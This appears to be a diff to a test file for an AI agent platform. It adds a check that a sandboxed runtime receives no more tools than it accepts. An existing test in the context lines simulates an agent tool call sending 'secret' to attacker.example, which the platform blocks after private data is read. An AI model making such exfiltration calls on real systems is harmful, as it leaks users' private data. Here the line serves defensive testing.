@@ -81,3 +81,18 @@ it('blocks open egress once a role-mode Session has read private data, and allow
   await expect(executeRunTool(f.env, run.id, { callId: 'exfil', name: 'read_url', arguments: { url: 'https://attacker.example/?d=secret' } }, () => {})).rejects.toMatchObject({ statusCode: 403 })
   expect(f.db.prepare("SELECT reason FROM agent_tool_decisions WHERE run_id=? AND call_id='exfil'").get(run.id)).toMatchObject({ reason: 'private_context_blocks_egress' })
 })
+
+it('gives a box turn no more tools than the runtime in the box admits, whatever the Agent may use', async () => {
+  const { MAX_RUNTIME_TOOLS, runtimeInput } = await import('../../packages/agent-runtime/src/protocol.mjs')
+  const { agentTools } = await import('../../server/utils/agent-tools')
+  const { run, authorization } = await f.run()
+  // The widest catalog: a Task's box, with every permission the Agent's role can hold.
+  const box = { ...run, environmentJson: JSON.stringify({ id: 'environment', computeNodeId: 'node' }), mandateJson: JSON.stringify({ ...JSON.parse(run.mandateJson), computer: true }) }
+  const tools = agentTools(f.env, authorization, () => {}, box).descriptors
+  // At 40 and beyond, the runtime refused every box turn before 0.0.20.
+  expect(tools.length).toBeGreaterThanOrEqual(40)
+  expect(tools.length).toBeLessThanOrEqual(MAX_RUNTIME_TOOLS)
+  const submission = { runId: crypto.randomUUID(), sessionId: crypto.randomUUID(), prompt: 'Build it', instructions: '', computer: true, box: true,
+    modelGateway: { url: 'https://server.test/v1', token: 'fixture-token-32-characters-long', model: 'fixture' }, toolEndpoint: 'https://server.test/tools', tools }
+  expect(runtimeInput.safeParse(submission).success).toBe(true)
+})
